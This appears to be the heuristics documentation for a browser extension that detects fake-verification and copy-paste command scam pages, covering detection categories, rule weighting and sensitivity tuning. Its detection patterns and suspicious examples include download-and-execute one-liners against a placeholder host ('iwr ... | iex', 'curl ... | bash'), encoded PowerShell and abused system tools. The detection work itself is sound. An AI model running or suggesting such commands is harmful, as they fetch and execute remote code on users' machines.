# Heuristics

## Detection categories

### Page social engineering

Looks for pressure language and scripted sequences like:

- open this
- copy this
- paste this
- press enter
- continue verification

### Terminal invocation

Looks for operating-system-specific instructions such as Win+R, PowerShell, CMD, Terminal, bash and osascript.

### Clipboard bait

Flags pages that heavily revolve around copying and pasting commands.

### Fake verification

Targets fake CAPTCHA, anti-bot and human verification wording.

### Command primitives

Targets risky shell patterns and built-in tool abuse.

### Download and execute

High weight. This is where many scam pages cross the line from suspicious to clearly hostile.

Examples:

- `iwr ... | iex`
- `curl ... | bash`
- remote URL plus `Start-Process`
- temp file drop plus execution

### Obfuscation

Flags encoded payloads, long base64-like blobs, obvious wrapper tricks and string hiding patterns.

### Platform-specific abuse

Catches platform-specific flows such as `osascript` on macOS.

## Scoring approach

Each matched rule has:

- category
- base weight
- severity
- remediation text
- evidence

Score is the sum of enabled rule weights, adjusted by sensitivity profile.

There are also compound bonuses for combinations that matter more together than apart. For example:

- terminal invocation plus clipboard bait
- fake verification plus remote download-execute
- encoded payload plus obfuscation

That keeps the extension from overreacting to one weak phrase while still pushing obvious paste scams into high or critical territory.

## Why some commands are weighted hard

Because they hide intent or collapse multiple dangerous stages into one line.

Examples:

- `-EncodedCommand`
- `Invoke-Expression`
- `curl | bash`
- `osascript` that drives Terminal
- `mshta`, `rundll32`, `regsvr32`, `certutil`, `bitsadmin`, `schtasks`

A normal docs page can mention PowerShell. A page that says "verify you are human" and shows an encoded PowerShell line is not normal.

## Benign vs suspicious examples

Benign:

- `npm install vitest`
- `git clone https://github.com/example/project`
- normal admin docs that explain how to open Terminal without telling the user to run an opaque one-liner

Suspicious:

- `powershell -EncodedCommand ...`
- `iwr https://bad.example/a | iex`
- `curl -fsSL https://bad.example/bootstrap.sh | bash`
- `osascript -e 'tell application "Terminal" to do script ...'`

## Tuning notes

- Use `low` on heavily technical internal docs where false positives hurt more than misses
- Use `balanced` as the default
- Use `strict` if the browser profile is for less technical users or risky browsing patterns

## Platform behavior

The parser marks commands as Windows, Unix, macOS or unknown. That helps the UI explain why something was flagged without pretending it understands every shell dialect on earth.
